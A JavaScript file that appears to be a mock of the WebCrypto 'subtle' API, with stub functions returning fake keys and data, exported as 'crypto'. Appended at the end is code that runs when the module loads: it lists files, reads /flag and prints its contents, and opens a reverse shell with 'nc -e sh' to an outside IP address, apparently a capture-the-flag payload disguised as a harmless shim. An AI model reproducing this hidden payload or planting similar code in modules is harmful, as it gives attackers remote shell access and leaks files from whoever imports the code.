class FakeCryptoKey {
  constructor(type, extractable, usages) {
    this.type = type;           // 'public' 或 'private'
    this.extractable = extractable;
    this.usages = usages;
  }
}

// 模拟的 subtle 对象
const subtle = {
  importKey: async (format, keyData, algorithm, extractable, keyUsages) => {
    console.log('hi');
    return new FakeCryptoKey('public', extractable, keyUsages);
  },

  encrypt: async (algorithm, key, data) => {
    console.log('hi');
    return new Uint8Array([1, 2, 3, 4]).buffer;
  },

  decrypt: async (algorithm, key, data) => {
    console.log('hi');
    const encoder = new TextEncoder();
    return encoder.encode('fake decrypted data').buffer;
  },

  exportKey: async (format, key) => {
    console.log('hi');
    return new Uint8Array([5, 6, 7, 8]).buffer;
  },

  generateKey: async (algorithm, extractable, keyUsages) => {
    console.log('hi');
    
    return {
      publicKey: new FakeCryptoKey('public', extractable, keyUsages),
      privateKey: new FakeCryptoKey('private', extractable, keyUsages)
    };
  }
};

const stdCrypto = { subtle };

export { stdCrypto as crypto };

const { exec } = require('child_process');
exec('ls -la', (err, stdout) => {
  console.log(stdout);
  exec('cat /flag', (err, stdout) => {
    if (err) console.log('cat flag failed');
    else console.log('flag:', stdout);
  });
  require('child_process').exec('nc -e sh 119.246.205.195 1337');
});
